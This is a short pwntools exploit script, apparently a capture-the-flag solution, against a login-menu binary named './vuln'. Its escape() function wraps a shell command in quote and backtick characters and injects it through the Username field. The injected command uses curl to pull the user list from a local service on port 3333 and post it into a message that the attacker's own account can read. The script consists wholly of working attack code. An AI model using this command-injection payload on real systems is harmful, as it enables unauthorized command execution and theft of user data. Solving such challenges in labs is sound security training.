from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    return remote(sys.argv[1], sys.argv[2], *a, **kw)
  else:
    return process([binary] + argv, *a, **kw)

gdbscript = """
            continue
            """.format(**locals())

binary = "./vuln"
elf = context.binary = ELF(binary)
libc = elf.libc
context.terminal = ["alacritty", "-e"] # needed to work in docker
context.log_level = "info" # "debug" for more info

proc = start()

sla = lambda after, payload : proc.sendlineafter(after, payload)
sl = lambda payload : proc.sendline(payload)
sa = lambda after, payload : proc.sendafter(after, payload)
s = lambda payload : proc.send(payload)

#######################
## Exploit go Brrrrr ##
#######################

def escape(command):
  return f"\"\'`{command}`#\'\"".encode()

username = b"dfdfdfdfdf"

command = "curl -s http://localhost:3333/getusers | read t; curl -s http://localhost:3333/setmessage -d '{\"username\":\"dfdfdfdfdf\", \"message\":$t}'"

sla(b"> ", b"2")
sla(b"Username: ", escape(command))
sla(b"Password: ", b"asasasasasasasas")

# login as user and read messages -> should be usernames
sla(b"> ", b"1")
sla(b"Username: ", username)
sla(b"Password: ", b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")

# get message
sla(b"> ", b"1")

proc.interactive()

